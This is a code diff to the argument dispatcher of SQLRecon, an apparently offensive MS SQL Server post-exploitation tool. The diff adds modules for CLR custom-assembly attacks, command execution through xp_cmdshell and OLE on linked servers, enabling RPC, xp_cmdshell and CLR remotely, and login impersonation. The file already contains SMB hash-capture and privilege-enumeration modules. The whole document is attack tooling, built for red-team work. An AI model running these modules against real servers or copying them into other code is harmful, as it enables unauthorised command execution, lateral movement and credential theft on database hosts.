@@ -1,4 +1,4 @@
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Data.SqlClient;
 using SQLRecon.Modules;
@@ -19,6 +19,7 @@ namespace SQLRecon.Auth
         private static String option = "";
         private static String linkedSqlServer = "";
         private static String impersonate = "";
+        private static String function = "";
 
         public void AuthenticationType(Dictionary<string, string> argDict)
         {
@@ -105,13 +106,29 @@ namespace SQLRecon.Auth
         // EvaluateTheArguments
         public static void EvaluateTheArguments(Dictionary<string, string> argDict)
         {
-            // standard single sql server logic
+            // ##############################################
+            // ###### Standard Single SQL Server Logic ######
+            // ##############################################
             // if the module type is query, then set the module to query and set option to the actual sql query
             if (argDict["m"].ToLower().Equals("query") && !argDict.ContainsKey("o"))
             {
                 Console.WriteLine("\n[!] ERROR: Must supply a query (-o)");
                 module = argDict["m"].ToLower();
                 return;
+            }
+            else if (argDict["m"].ToLower().Equals("tables"))
+            {
+                if (!argDict.ContainsKey("o"))
+                {
+                    Console.WriteLine("\n[!] ERROR: Must supply a database on the SQL server (-o)");
+                    module = argDict["m"].ToLower();
+                    return;
+                }
+                else
+                {
+                    module = argDict["m"].ToLower();
+                    option = argDict["o"];
+                }
             }
             else if (argDict["m"].ToLower().Equals("smb") && !argDict.ContainsKey("o"))
             {
@@ -137,6 +154,21 @@ namespace SQLRecon.Auth
                 module = argDict["m"].ToLower();
                 return;
             }
+            else if (argDict["m"].ToLower().Equals("clr"))
+            {
+                if (!argDict.ContainsKey("o") || !argDict.ContainsKey("f"))
+                {
+                    Console.WriteLine("\n[!] ERROR: Must supply path to DLL (-o) and function name (-f)");
+                    module = argDict["m"].ToLower();
+                    return;
+                }
+                else
+                {
+                    module = argDict["m"].ToLower();
+                    option = argDict["o"];
+                    function = argDict["f"];
+                }
+            }
             else if (argDict.ContainsKey("o"))
             {
                 module = argDict["m"].ToLower();
@@ -147,7 +179,9 @@ namespace SQLRecon.Auth
                 module = argDict["m"].ToLower();
             }
 
-            // linked queries logic
+            // #####################################
+            // ###### Linked SQL Server Logic ######
+            // #####################################
             // if the module type is lquery, then set the linkedSqlServer, set the module to lquery and set option to the actual sql query
             if (argDict["m"].ToLower().Equals("lquery"))
             {
@@ -194,6 +228,64 @@ namespace SQLRecon.Auth
                     linkedSqlServer = argDict["l"];
                 }
             }
+            else if (argDict["m"].ToLower().Equals("lxpcmd"))
+            {
+                if (!argDict.ContainsKey("l") || !argDict.ContainsKey("o"))
+                {
+                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l) and command (-o)");
+                    module = argDict["m"].ToLower();
+                    return;
+                }
+                else
+                {
+                    module = argDict["m"].ToLower();
+                    option = argDict["o"];
+                    linkedSqlServer = argDict["l"];
+                }
+            }
+            else if (argDict["m"].ToLower().Equals("lolecmd"))
+            {
+                if (!argDict.ContainsKey("l") || !argDict.ContainsKey("o"))
+                {
+                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l) and command (-o)");
+                    module = argDict["m"].ToLower();
+                    return;
+                }
+                else
+                {
+                    module = argDict["m"].ToLower();
+                    option = argDict["o"];
+                    linkedSqlServer = argDict["l"];
+                }
+            }
+            else if (argDict["m"].ToLower().Equals("lenablerpc"))
+            {
+                if (!argDict.ContainsKey("l"))
+                {
+                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l) you want to enable RPC on");
+                    module = argDict["m"].ToLower();
+                    return;
+                }
+                else
+                {
+                    module = argDict["m"].ToLower();
+                    linkedSqlServer = argDict["l"];
+                }
+            }
+            else if (argDict["m"].ToLower().Equals("ldisablerpc"))
+            {
+                if (!argDict.ContainsKey("l"))
+                {
+                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l) you want to disable RPC on");
+                    module = argDict["m"].ToLower();
+                    return;
+                }
+                else
+                {
+                    module = argDict["m"].ToLower();
+                    linkedSqlServer = argDict["l"];
+                }
+            }
             else if (argDict["m"].ToLower().Equals("ldatabases"))
             {
                 if (!argDict.ContainsKey("l"))
@@ -236,12 +328,98 @@ namespace SQLRecon.Auth
                     linkedSqlServer = argDict["l"];
                 }
             }
+            else if (argDict["m"].ToLower().Equals("lenablexp"))
+            {
+                if (!argDict.ContainsKey("l"))
+                {
+                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
+                    module = argDict["m"].ToLower();
+                    return;
+                }
+                else
+                {
+                    module = argDict["m"].ToLower();
+                    linkedSqlServer = argDict["l"];
+                }
+            }
+            else if (argDict["m"].ToLower().Equals("ldisablexp"))
+            {
+                if (!argDict.ContainsKey("l"))
+                {
+                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
+                    module = argDict["m"].ToLower();
+                    return;
+                }
+                else
+                {
+                    module = argDict["m"].ToLower();
+                    linkedSqlServer = argDict["l"];
+                }
+            }
+            else if (argDict["m"].ToLower().Equals("lenableole"))
+            {
+                if (!argDict.ContainsKey("l"))
+                {
+                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
+                    module = argDict["m"].ToLower();
+                    return;
+                }
+                else
+                {
+                    module = argDict["m"].ToLower();
+                    linkedSqlServer = argDict["l"];
+                }
+            }
+            else if (argDict["m"].ToLower().Equals("ldisableole"))
+            {
+                if (!argDict.ContainsKey("l"))
+                {
+                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
+                    module = argDict["m"].ToLower();
+                    return;
+                }
+                else
+                {
+                    module = argDict["m"].ToLower();
+                    linkedSqlServer = argDict["l"];
+                }
+            }
+            else if (argDict["m"].ToLower().Equals("lenableclr"))
+            {
+                if (!argDict.ContainsKey("l"))
+                {
+                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
+                    module = argDict["m"].ToLower();
+                    return;
+                }
+                else
+                {
+                    module = argDict["m"].ToLower();
+                    linkedSqlServer = argDict["l"];
+                }
+            }
+            else if (argDict["m"].ToLower().Equals("ldisableclr"))
+            {
+                if (!argDict.ContainsKey("l"))
+                {
+                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
+                    module = argDict["m"].ToLower();
+                    return;
+                }
+                else
+                {
+                    module = argDict["m"].ToLower();
+                    linkedSqlServer = argDict["l"];
+                }
+            }
             else
             {
                 module = argDict["m"].ToLower();
             }
 
-            // impersonation queries logic
+            // ############################################
+            // ###### Impersonation SQL Server Logic ######
+            // ############################################
             // if the module type is impersonate, then set the sqlServer, set the module to impersonate and set option to the actual sql query
             if (argDict["m"].ToLower().Equals("iquery"))
             {
@@ -270,6 +448,20 @@ namespace SQLRecon.Auth
                 {
                     module = argDict["m"].ToLower();
                     option = argDict["o"];
+                    impersonate = argDict["i"];
+                }
+            }
+            else if (argDict["m"].ToLower().Equals("iwhoami"))
+            {
+                if (!argDict.ContainsKey("i"))
+                {
+                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i)");
+                    module = argDict["m"].ToLower();
+                    return;
+                }
+                else
+                {
+                    module = argDict["m"].ToLower();
                     impersonate = argDict["i"];
                 }
             }
@@ -316,6 +508,22 @@ namespace SQLRecon.Auth
                     impersonate = argDict["i"];
                 }
             }
+            else if (argDict["m"].ToLower().Equals("iclr"))
+            {
+                if (!argDict.ContainsKey("i") || !argDict.ContainsKey("o") || !argDict.ContainsKey("f"))
+                {
+                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i),  path to DLL (-o) and function name (-f)");
+                    module = argDict["m"].ToLower();
+                    return;
+                }
+                else
+                {
+                    module = argDict["m"].ToLower();
+                    option = argDict["o"];
+                    function = argDict["f"];
+                    impersonate = argDict["i"];
+                }
+            }
             else if (argDict["m"].ToLower().Equals("ienableole"))
             {
                 if (!argDict.ContainsKey("i"))
@@ -344,6 +552,34 @@ namespace SQLRecon.Auth
                     impersonate = argDict["i"];
                 }
             }
+            else if (argDict["m"].ToLower().Equals("ienableclr"))
+            {
+                if (!argDict.ContainsKey("i"))
+                {
+                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i)");
+                    module = argDict["m"].ToLower();
+                    return;
+                }
+                else
+                {
+                    module = argDict["m"].ToLower();
+                    impersonate = argDict["i"];
+                }
+            }
+            else if (argDict["m"].ToLower().Equals("idisableclr"))
+            {
+                if (!argDict.ContainsKey("i"))
+                {
+                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i)");
+                    module = argDict["m"].ToLower();
+                    return;
+                }
+                else
+                {
+                    module = argDict["m"].ToLower();
+                    impersonate = argDict["i"];
+                }
+            }
             else
             {
                 module = argDict["m"].ToLower();
@@ -351,226 +587,324 @@ namespace SQLRecon.Auth
 
             // this is effectively a huge module switch
 
+            // ##########################################
+            // ########## Standard SQL Modules ##########
+            // ##########################################
 
-            // ##########################################
-            // ########## standard sql modules ##########
-            // ##########################################
-            // if the module type is querylogin, then execute the querylogin sql query
+            SQLQuery sqlQuery = new SQLQuery();
+
+            // whoami
             if (module.Equals("whoami"))
             {
-                Console.Out.WriteLine("\n[+] Logged in as: ");
-                ExecuteQuery ExecuteQuery = new ExecuteQuery(con, "SELECT SYSTEM_USER;");
-            }
-            // if the module type is mapped, then execute the mapped sql query
-            else if (module.Equals("mapped"))
-            {
-                Console.Out.WriteLine("\n[+] Mapped to the user: ");
-                ExecuteQuery ExecuteQuery = new ExecuteQuery(con, "SELECT USER_NAME();");
-            }
-            // if the module type is roles, then execute the roles module
-            else if (module.Equals("roles"))
-            {
-                Console.Out.WriteLine("\n[+] Enumerating roles: ");
-                Roles Roles = new Roles();
+                Console.Out.WriteLine("\n[+] Logged in as: " + sqlQuery.ExecuteQuery(con, "SELECT SYSTEM_USER;"));
+                Console.Out.WriteLine("\n[+] Mapped to the user: " + sqlQuery.ExecuteQuery(con, "SELECT USER_NAME(); "));
 
-                Roles.Public(con);
-                Roles.SysAdmin(con);
+                Console.Out.WriteLine("\n[+] Roles: ");
+                Roles Roles = new Roles();
+                Roles.Server(con, "public");
+                Roles.Server(con, "sysadmin");
             }
+            // databases
             else if (module.Equals("databases"))
             {
-                Console.Out.WriteLine("\n[+] Databases: ");
-                ExecuteQuery ExecuteQuery = new ExecuteQuery(con, "SELECT name FROM master.dbo.sysdatabases;");
+                Console.Out.WriteLine("\n[+] Databases in " + sqlServer + ":" + sqlQuery.ExecuteCustomQuery(con, "SELECT dbid, name, crdate, filename FROM master.dbo.sysdatabases;"));
             }
+            // tables 
             else if (module.Equals("tables"))
             {
-                Console.Out.WriteLine("\n[+] Tables in " + database + ":");
-                ExecuteQuery ExecuteQuery = new ExecuteQuery(con, "SELECT CONCAT(TABLE_SCHEMA,'.',TABLE_NAME) FROM " + database + ".INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';");
+                Console.Out.WriteLine("\n[+] Tables in " + option + ":" + sqlQuery.ExecuteCustomQuery(con, "select * from " + option + ".INFORMATION_SCHEMA.TABLES;"));
             }
-            // if the module type is query, then excute the ExecuteQuery module with the supplied sql query
+            // query
             else if (module.Equals("query"))
             {
-                Console.Out.WriteLine("\n[+] Executing: " + option);
-                ExecuteCustomQuery ExecuteCustomQuery = new ExecuteCustomQuery(con, option);
+                Console.Out.WriteLine("\n[+] Executing: " + option + " on " + sqlServer + ":" + sqlQuery.ExecuteCustomQuery(con, option));
             }
+            // search 
             else if (module.Equals("search"))
             {
-                Console.Out.WriteLine("\n[+] Searching for columns containing " + option + " in " + database);
-                SearchKeyword SearchKeyword = new SearchKeyword(con, "select table_name, column_name from INFORMATION_SCHEMA.COLUMNS where column_name like '%" + option + "%';");
+                Console.Out.WriteLine("\n[+] Searching for columns containing " + option + " in " + database + ": " + sqlQuery.ExecuteCustomQuery(con, "select table_name, column_name from INFORMATION_SCHEMA.COLUMNS where column_name like '%" + option + "%';"));
             }
-            // if the module type is smb, then excute the CaptureHash module with the supplied smb share
+            // smb
             else if (module.Equals("smb"))
             {
                 Console.Out.WriteLine("\n[+] Sending SMB Request to: " + option);
-                CaptureHash CaptureHash = new CaptureHash(con, option);
+                SMB smb = new SMB();
+                smb.CaptureHash(con, option);
             }
-            // if the module type is impersonate, then excute the impersonate module
+            // impersonate
             else if (module.Equals("impersonate"))
             {
-                Console.Out.WriteLine("\n[+] Enumerating accounts that can be impersonated: ");
-                EnumImpersonation EnumImpersonation = new EnumImpersonation(con);
+                Console.Out.WriteLine("\n[+] Enumerating accounts that can be impersonated on " + sqlServer + ":");
+                Impersonate impersonate = new Impersonate();
+                impersonate.Check(con);
             }
-            // if the module type is enablexp, then excute the XPCmdShell module and enable xp_cmdshell
+            // enablexp
             else if (module.Equals("enablexp"))
             {
-                Console.Out.WriteLine("\n[+] Enabling xp_cmdshell on: " + sqlServer);
-                XPCmdShell XPCmdShell = new XPCmdShell();
-                XPCmdShell.Enable(con);
+                Console.Out.WriteLine("\n[+] Enabling xp_cmdshell on: " + sqlServer + ":");
+                Configure config = new Configure();
+                config.EnableDisable(con, "xp_cmdshell", "1");
             }
-            // if the module type is enablexp, then excute the XPCmdShell module and disable xp_cmdshell
+            // disablexp
             else if (module.Equals("disablexp"))
             {
-                Console.Out.WriteLine("\n[+] Disabling xp_cmdshell on: " + sqlServer);
-                XPCmdShell XPCmdShell = new XPCmdShell();
-                XPCmdShell.Disable(con);
+                Console.Out.WriteLine("\n[+] Disabling xp_cmdshell on: " + sqlServer + ":");
+                Configure config = new Configure();
+                config.EnableDisable(con, "xp_cmdshell", "0");
             }
-            // if the module type is xpcmd, then excute the XPCmdShell.Command module with the supplied command
+            // xpcmd
             else if (module.Equals("xpcmd"))
             {
-                Console.Out.WriteLine("\n[+] Executing " + option + " on " + sqlServer);
+                Console.Out.WriteLine("\n[+] Executing '" + option + "' on " + sqlServer + ":");
                 XPCmdShell XPCmdShell = new XPCmdShell();
-                XPCmdShell.Command(con, option);
+                XPCmdShell.StandardCommand(con, option);
             }
-            // if the module type is enableole, then excute the OLE module and enable Ole Automation Procedures
+            // enableole
             else if (module.Equals("enableole"))
             {
                 Console.Out.WriteLine("\n[+] Enabling Ole Automation Procedures on: " + sqlServer);
-                OLE Ole = new OLE();
-                Ole.Enable(con);
+                Configure config = new Configure();
+                config.EnableDisable(con, "Ole Automation Procedures", "1");
             }
-            // if the module type is disableole, then excute the OLE module and disable Ole Automation Procedures
+            // disableole
             else if (module.Equals("disableole"))
             {
                 Console.Out.WriteLine("\n[+] Disabling Ole Automation Procedures on: " + sqlServer);
-                OLE Ole = new OLE();
-                Ole.Disable(con);
+                Configure config = new Configure();
+                config.EnableDisable(con, "Ole Automation Procedures", "0");
             }
-            // if the module type is olecmd, then excute the OLE.Command module with the supplied command
+            // olecmd
             else if (module.Equals("olecmd"))
             {
-                Console.Out.WriteLine("\n[+] Executing " + option + " on " + sqlServer);
-                OLE Ole = new OLE();
-                Ole.Command(con, option);
+                Console.Out.WriteLine("\n[+] Executing '" + option + "' on " + sqlServer);
+                OLE ole = new OLE();
+                ole.StandardCommand(con, option);
             }
-            // if the module type is enableclr, then excute the CLR module and enable CLR integration
+            // enableclr
             else if (module.Equals("enableclr"))
             {
                 Console.Out.WriteLine("\n[+] Enabling CLR integration on: " + sqlServer);
-                CLR clr = new CLR();
-                clr.Enable(con);
+                Configure config = new Configure();
+                config.EnableDisable(con, "clr enabled", "1");
             }
-            // if the module type is disableclr, then excute the CLR module and disable CLR integration
+            //  disableclr
             else if (module.Equals("disableclr"))
             {
                 Console.Out.WriteLine("\n[+] Disabling CLR integration on: " + sqlServer);
-                CLR clr = new CLR();
-                clr.Disable(con);
+                Configure config = new Configure();
+                config.EnableDisable(con, "clr enabled", "0");
             }
-
-            // if the module type is links, then excute the ExecuteQuery module with the supplied sql query
+            // clr
+            else if (module.Equals("clr"))
+            {
+                Console.Out.WriteLine("\n[+] Performing CLR custom assembly attack on: " + sqlServer);
+                CLR clr = new CLR();
+                clr.Standard(con, option, function);
+            }
+            // links
             else if (module.Equals("links"))
             {
-                Console.Out.WriteLine("\n[+] Additional Links: ");
-                ExecuteQuery ExecuteQuery = new ExecuteQuery(con, "EXEC ('sp_linkedservers');");
+                Console.Out.WriteLine("\n[+] Additional Links on " + sqlServer + ": " + sqlQuery.ExecuteCustomQuery(con, "SELECT name, provider, data_source FROM sys.servers WHERE is_linked = 1;"));
+
             }
 
             // ########################################
-            // ########## linked sql modules ##########
+            // ########## Linked SQL Modules ##########
             // ########################################
+
+            // ldatabases
             else if (module.Equals("ldatabases"))
             {
-                Console.Out.WriteLine("\n[+] Databases on " + linkedSqlServer + " via " + sqlServer);
-                option = "select name from sys.databases;";
-                ExecuteLinkedQuery ExecuteCustomLinkedQuery = new ExecuteLinkedQuery(con, linkedSqlServer, option);
+                Console.Out.WriteLine("\n[+] Databases on " + linkedSqlServer + " via " + sqlServer + ": " + sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer, "SELECT dbid, name, crdate, filename from master.dbo.sysdatabases;"));
             }
+            // ltables
             else if (module.Equals("ltables"))
             {
-                Console.Out.WriteLine("\n[+] Tables in database " + database + " on " + linkedSqlServer + " via " + sqlServer);
-                option = "select * from " + option + ".INFORMATION_SCHEMA.TABLES;";
-                ExecuteLinkedQuery ExecuteCustomLinkedQuery = new ExecuteLinkedQuery(con, linkedSqlServer, option);
+                Console.Out.WriteLine("\n[+] Tables in database " + option + " on " + linkedSqlServer + " via " + sqlServer + ": " + sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer, "select * from " + option + ".INFORMATION_SCHEMA.TABLES;"));
+
             }
+            // lquery
             else if (module.Equals("lquery"))
             {
-                Console.Out.WriteLine("\n[+] Executing " + option + " on " + linkedSqlServer + " via " + sqlServer);
-                ExecuteLinkedQuery ExecuteCustomLinkedQuery = new ExecuteLinkedQuery(con, linkedSqlServer, option);
+                Console.Out.WriteLine("\n[+] Executing " + option + " on " + linkedSqlServer + " via " + sqlServer + ": " + sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer, option));
             }
+            // lsmb
             else if (module.Equals("lsmb"))
             {
                 Console.Out.WriteLine("\n[+] Sending SMB Request from " + linkedSqlServer + " to " + option + " via " + sqlServer);
-                CaptureLinkedHash CaptureLinkedHash = new CaptureLinkedHash(con, linkedSqlServer, option);
+                SMB smb = new SMB();
+                smb.CaptureLinkedHash(con, linkedSqlServer, option);
             }
+            // lwhoami
             else if (module.Equals("lwhoami"))
             {
-                Console.Out.WriteLine("\n[+] Executing 'SELECT SYSTEM_USER' on " + linkedSqlServer + " via " + sqlServer);
+                Console.Out.WriteLine("\n[+] Determining user permissions on " + linkedSqlServer + " via " + sqlServer + ":");
 
-                Console.Out.WriteLine("\n[+] Logged in as: ");
-                ExecuteLinkedQuery ExecuteCustomLinkedQuery = new ExecuteLinkedQuery(con, linkedSqlServer, "SELECT SYSTEM_USER;");
+                Console.Out.WriteLine("\n[+] Logged in as: " + sqlQuery.ExecuteLinkedQuery(con, linkedSqlServer, "SELECT SYSTEM_USER;"));
+                Console.Out.WriteLine("\n[+] Mapped to the user: " + sqlQuery.ExecuteLinkedQuery(con, linkedSqlServer, "SELECT USER_NAME(); "));
+
+                Console.Out.WriteLine("\n[+] Roles: ");
+                Roles Roles = new Roles();
+                Roles.Linked(con, "public", linkedSqlServer);
+                Roles.Linked(con, "sysadmin", linkedSqlServer);
             }
-            else if (module.Equals("lroles"))
+            // lenablerpc
+            else if (module.Equals("lenablerpc"))
             {
-                Console.Out.WriteLine("\n[+] Enumerating roles on " + linkedSqlServer + " via " + sqlServer);
-
-                LinkedRoles LinkedRoles = new LinkedRoles();
-
-                LinkedRoles.LinkedPublic(con, linkedSqlServer);
-                LinkedRoles.LinkedSysAdmin(con, linkedSqlServer);
+                Console.Out.WriteLine("\n[+] Enabling RPC on: " + linkedSqlServer);
+                Configure config = new Configure();
+                config.EnableDisableRpc(con, "1", linkedSqlServer);
+            }
+            //  ldisablerpc
+            else if (module.Equals("ldisablerpc"))
+            {
+                Console.Out.WriteLine("\n[+] Disabling RPC on: " + linkedSqlServer);
+                Configure config = new Configure();
+                config.EnableDisableRpc(con, "0", linkedSqlServer);
+            }
+            // lenablexp
+            else if (module.Equals("lenablexp"))
+            {
+                Console.Out.WriteLine("\n[+] Enabling xp_cmdshell on " + linkedSqlServer + " via " + sqlServer + ":");
+                Configure config = new Configure();
+                config.LinkedEnableDisable(con, "xp_cmdshell", "1", linkedSqlServer);
+            }
+            // ldisablexp
+            else if (module.Equals("ldisablexp"))
+            {
+                Console.Out.WriteLine("\n[+] Disabling xp_cmdshell on " + linkedSqlServer + " via " + sqlServer + ":");
+                Configure config = new Configure();
+                config.LinkedEnableDisable(con, "xp_cmdshell", "0", linkedSqlServer);
+            }
+            // lenableole
+            else if (module.Equals("lenableole"))
+            {
+                Console.Out.WriteLine("\n[+] Enabling OLE Automation Procedures on " + linkedSqlServer + " via " + sqlServer + ":");
+                Configure config = new Configure();
+                config.LinkedEnableDisable(con, "OLE Automation Procedures", "1", linkedSqlServer);
+            }
+            // ldisableole
+            else if (module.Equals("ldisableole"))
+            {
+                Console.Out.WriteLine("\n[+] Disabling OLE Automation Procedures on " + linkedSqlServer + " via " + sqlServer + ":");
+                Configure config = new Configure();
+                config.LinkedEnableDisable(con, "OLE Automation Procedures", "0", linkedSqlServer);
+            }
+            // lenableclr
+            else if (module.Equals("lenableclr"))
+            {
+                Console.Out.WriteLine("\n[+] Enabling CLR integration on " + linkedSqlServer + " via " + sqlServer + ":");
+                Configure config = new Configure();
+                config.LinkedEnableDisable(con, "clr enabled", "1", linkedSqlServer);
+            }
+            // ldisableclr
+            else if (module.Equals("ldisableclr"))
+            {
+                Console.Out.WriteLine("\n[+] Disabling CLR integration on " + linkedSqlServer + " via " + sqlServer + ":");
+                Configure config = new Configure();
+                config.LinkedEnableDisable(con, "clr enabled", "0", linkedSqlServer);
+            }
+            // lxpcmd
+            else if (module.Equals("lxpcmd"))
+            {
+                Console.Out.WriteLine("\n[+] Executing '" + option + "' on " + linkedSqlServer + " via " + sqlServer + ":");
+                XPCmdShell XPCmdShell = new XPCmdShell();
+                XPCmdShell.LinkedCommand(con, option, linkedSqlServer);
+            }
+            else if (module.Equals("lolecmd"))
+            {
+                Console.Out.WriteLine("\n[+] Executing '" + option + "' on " + linkedSqlServer + " via " + sqlServer + ":");
+                OLE Ole = new OLE();
+                Ole.LinkedCommand(con, option, linkedSqlServer);
             }
 
             // ###############################################
-            // ########## impersonation sql modules ##########
+            // ########## Impersonation SQL Modules ##########
             // ###############################################
+
+            // iwhoami
+            else if (module.Equals("iwhoami"))
+            {
+                Console.Out.WriteLine("\n[+] Logged in as: " + sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; SELECT SYSTEM_USER;"));
+                Console.Out.WriteLine("\n[+] Mapped to the user: " + sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "';SELECT USER_NAME();"));
+
+                Console.Out.WriteLine("\n[+] Roles: ");
+                Roles Roles = new Roles();
+                Roles.Impersonate(con, "public", impersonate);
+                Roles.Impersonate(con, "sysadmin", impersonate);
+            }
+            // iquery
             else if (module.Equals("iquery"))
             {
-                Console.Out.WriteLine("\n[+] Executing " + option + " as " + impersonate + " on " + sqlServer);
-                ExecuteCustomQuery ExecuteCustomQuery = new ExecuteCustomQuery(con, "EXECUTE AS LOGIN = '" + impersonate +"'; " + option);
+                Console.Out.WriteLine("\n[+] Executing " + option + " as " + impersonate + " on " + sqlServer + ":" + sqlQuery.ExecuteCustomQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; " + option));
             }
-            // if the module type is enablexp, then excute the XPCmdShell module and enable xp_cmdshell
+            // ienablexp
             else if (module.Equals("ienablexp"))
             {
                 Console.Out.WriteLine("\n[+] Enabling xp_cmdshell as " + impersonate + " on " + sqlServer);
-                XPCmdShell XPCmdShell = new XPCmdShell();
-                XPCmdShell.Enable(con, impersonate);
+                Configure config = new Configure();
+                config.EnableDisable(con, "xp_cmdshell", "1", impersonate);
             }
-            // if the module type is enablexp, then excute the XPCmdShell module and disable xp_cmdshell
+            // idisablexp
             else if (module.Equals("idisablexp"))
             {
                 Console.Out.WriteLine("\n[+] Disabling xp_cmdshell as " + impersonate + " on " + sqlServer);
-                XPCmdShell XPCmdShell = new XPCmdShell();
-                XPCmdShell.Disable(con, impersonate);
+                Configure config = new Configure();
+                config.EnableDisable(con, "xp_cmdshell", "0", impersonate);
             }
-            // if the module type is xpcmd, then excute the XPCmdShell.Command module with the supplied command
+            // ixpcmd
             else if (module.Equals("ixpcmd"))
             {
-                Console.Out.WriteLine("\n[+] Executing " + option + " as " + impersonate + " on " + sqlServer);
+                Console.Out.WriteLine("\n[+] Executing '" + option + "' as " + impersonate + " on " + sqlServer);
                 XPCmdShell XPCmdShell = new XPCmdShell();
-                XPCmdShell.Command(con, option, impersonate);
+                XPCmdShell.ImpersonateCommand(con, option, impersonate);
             }
-            // if the module type is enableole, then excute the OLE module and enable Ole Automation Procedures
+            // ienableole
             else if (module.Equals("ienableole"))
             {
                 Console.Out.WriteLine("\n[+] Enabling Ole Automation Procedures as " + impersonate + " on " + sqlServer);
-                OLE Ole = new OLE();
-                Ole.Enable(con, impersonate);
+                Configure config = new Configure();
+                config.EnableDisable(con, "Ole Automation Procedures", "1", impersonate);
             }
-            // if the module type is disableole, then excute the OLE module and disable Ole Automation Procedures
+            // idisableole
             else if (module.Equals("idisableole"))
             {
                 Console.Out.WriteLine("\n[+] Disabling Ole Automation Procedures as " + impersonate + " on " + sqlServer);
-                OLE Ole = new OLE();
-                Ole.Disable(con, impersonate);
+                Configure config = new Configure();
+                config.EnableDisable(con, "Ole Automation Procedures", "0", impersonate);
             }
-            // if the module type is olecmd, then excute the OLE.Command module with the supplied command
+            // iolecmd
             else if (module.Equals("iolecmd"))
             {
-                Console.Out.WriteLine("\n[+] Executing " + option + " as " + impersonate + " on " + sqlServer);
+                Console.Out.WriteLine("\n[+] Executing '" + option + "' as " + impersonate + " on " + sqlServer);
                 OLE Ole = new OLE();
-                Ole.Command(con, option, impersonate);
+                Ole.ImpersonateCommand(con, option, impersonate);
             }
-
+            // ienableclr
+            else if (module.Equals("ienableclr"))
+            {
+                Console.Out.WriteLine("\n[+] Enabling CLR Integration as " + impersonate + " on " + sqlServer);
+                Configure config = new Configure();
+                config.EnableDisable(con, "clr enabled", "1", impersonate);
+            }
+            // idisableclr
+            else if (module.Equals("idisableclr"))
+            {
+                Console.Out.WriteLine("\n[+] Disabling CLR Integration as " + impersonate + " on " + sqlServer);
+                Configure config = new Configure();
+                config.EnableDisable(con, "clr enabled", "0", impersonate);
+            }
+            // iclr
+            else if (module.Equals("iclr"))
+            {
+                Console.Out.WriteLine("\n[+] Performing CLR custom assembly attack as " + impersonate + " on " + sqlServer);
+                CLR clr = new CLR();
+                clr.Impersonate(con, option, function, impersonate);
+            }
             else
             {
-                Console.WriteLine("[!] ERROR: Module " + module + " does not exist\n");
+                Console.WriteLine("\n[!] ERROR: Module " + module + " does not exist\n");
             }
-            
         } // end EvaluateTheArguments
     }
 }
